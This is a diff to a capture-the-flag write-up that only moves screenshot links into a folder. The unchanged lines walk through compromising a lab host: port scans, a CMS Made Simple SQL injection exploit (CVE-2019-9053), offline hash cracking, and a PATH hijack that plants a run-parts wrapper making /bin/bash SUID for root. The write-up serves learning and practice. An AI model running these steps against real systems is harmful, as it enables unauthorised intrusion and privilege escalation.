@@ -42,7 +42,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.30.59
 ```
 
-![ping](writeup_01_ping.png)
+![ping](screenshots/writeup_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -53,7 +53,7 @@ Scan all TCP ports to identify open services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.30.59 -oG allPorts
 ```
 
-![allports](writeup_02_nmap_allports.png)
+![allports](screenshots/writeup_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -61,7 +61,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](writeup_03_extractports.png)
+![extractports](screenshots/writeup_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -73,7 +73,7 @@ nmap -sCV -p22,80 10.129.30.59 -oN targeted
 cat targeted
 ```
 
-![targeted](writeup_04_nmap_targeted.png)
+![targeted](screenshots/writeup_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -93,7 +93,7 @@ The Nmap scripts already hinted at `robots.txt`, so I checked it first to avoid 
 #browser: http://10.129.30.59/
 ```
 
-![landing_dos_warning](writeup_05_http_landing_dos_warning.png)
+![landing_dos_warning](screenshots/writeup_05_http_landing_dos_warning.png)
 
 From there, I checked `robots.txt` (to avoid noisy scanning that could trigger bans):
 
@@ -101,7 +101,7 @@ From there, I checked `robots.txt` (to avoid noisy scanning that could trigger b
 #browser: http://10.129.30.59/robots.txt
 ```
 
-![robots](writeup_06_robots.png)
+![robots](screenshots/writeup_06_robots.png)
 
 The disallowed path exposed the real site content:
 
@@ -109,7 +109,7 @@ The disallowed path exposed the real site content:
 #browser: http://10.129.30.59/writeup/
 ```
 
-![cmsms_home](writeup_07_cmsms_home.png)
+![cmsms_home](screenshots/writeup_07_cmsms_home.png)
 
 ### 2.2 CMS Identification (CMS Made Simple)
 
@@ -119,7 +119,7 @@ From the HTML, the generator meta tag identifies the CMS:
 curl -s "http://10.129.30.59/writeup/index.php?page=writeup" | sed -n '1,60p'
 ```
 
-![cmsms_generator_meta](writeup_08_cmsms_generator_meta.png)
+![cmsms_generator_meta](screenshots/writeup_08_cmsms_generator_meta.png)
 
 ---
 ## 3. Foothold
@@ -132,7 +132,7 @@ With CMSMS identified and a 2019-era install strongly suggested by the generator
 searchsploit "CMS Made Simple" 2019
 ```
 
-![searchsploit](writeup_09_searchsploit_2019.png)
+![searchsploit](screenshots/writeup_09_searchsploit_2019.png)
 
 The relevant candidate is the CMSMS SQL injection (CVE-2019-9053). In my case, the PoC output was **inconsistent across runs** (some characters were missing/corrupted in the extracted salt/hash), so I had to run it **multiple times** and reconstruct the full hex strings before cracking offline. Once I had complete values, a Python3 PoC for that CVE against the `/writeup/` base path returned:
 
@@ -141,10 +141,10 @@ The relevant candidate is the CMSMS SQL injection (CVE-2019-9053). In my case, t
 - email
 - password hash (not plaintext)
 
-![cve_output](writeup_10_cve_2019_9053_output.png)
-![hash_attempt1](writeup_11_hash_formatting_attempt1.png)
-![hash_attempt2](writeup_12_hash_formatting_attempt2.png)
-![hash_attempt3](writeup_13_hash_formatting_attempt3.png)
+![cve_output](screenshots/writeup_10_cve_2019_9053_output.png)
+![hash_attempt1](screenshots/writeup_11_hash_formatting_attempt1.png)
+![hash_attempt2](screenshots/writeup_12_hash_formatting_attempt2.png)
+![hash_attempt3](screenshots/writeup_13_hash_formatting_attempt3.png)
 
 Hash: `62def4866937f08cc13bab43bb14e6f7:5a599ef579066807`
 
@@ -157,7 +157,7 @@ echo '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > final_hash.txt
 hashcat -a 0 -m 20 final_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![hashcat_cracked](writeup_14_hashcat_cracked.png)
+![hashcat_cracked](screenshots/writeup_14_hashcat_cracked.png)
 
 If your extracted hash/salt are incomplete (non-hex), hashcat will refuse to load them. These were the intermediate attempts during this run:
 
@@ -173,7 +173,7 @@ whoami
 cat user.txt
 ```
 
-![ssh_user_flag](writeup_15_ssh_user_flag.png)
+![ssh_user_flag](screenshots/writeup_15_ssh_user_flag.png)
 
 🏁 **User flag obtained** 
 
@@ -193,8 +193,8 @@ ls -ld /usr/local/bin /usr/local/sbin
 echo "$PATH"
 ```
 
-![id_no_sudo](writeup_17_id_no_sudo_hostname.png)
-![staff_path_perms](writeup_18_staff_writable_localbin_path.png)
+![id_no_sudo](screenshots/writeup_17_id_no_sudo_hostname.png)
+![staff_path_perms](screenshots/writeup_18_staff_writable_localbin_path.png)
 
 This shows:
 
@@ -212,7 +212,7 @@ wget -O pspy32 https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/p
 scp pspy32 jkr@10.129.30.59:/tmp/pspy32
 ```
 
-![pspy_download_scp](writeup_16_pspy_download_scp.png)
+![pspy_download_scp](screenshots/writeup_16_pspy_download_scp.png)
 
 ``` bash
 # on target
@@ -220,7 +220,7 @@ chmod +x /tmp/pspy32
 /tmp/pspy32
 ```
 
-![pspy_root_runparts](writeup_19_pspy_root_runparts.png)
+![pspy_root_runparts](screenshots/writeup_19_pspy_root_runparts.png)
 
 On a new SSH login, `pspy` showed root executing:
 
@@ -238,7 +238,7 @@ echo -e '#!/bin/sh\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
 chmod +x /usr/local/bin/run-parts
 ```
 
-![drop_runparts](writeup_20_drop_runparts_wrapper.png)
+![drop_runparts](screenshots/writeup_20_drop_runparts_wrapper.png)
 
 After opening a new SSH session, I verified `/bin/bash` is now SUID and used `-p` to keep effective root privileges:
 
@@ -249,7 +249,7 @@ id
 cat /root/root.txt
 ```
 
-![root_proof](writeup_21_root_proof.png)
+![root_proof](screenshots/writeup_21_root_proof.png)
 
 🏁 **Root flag obtained** 
 
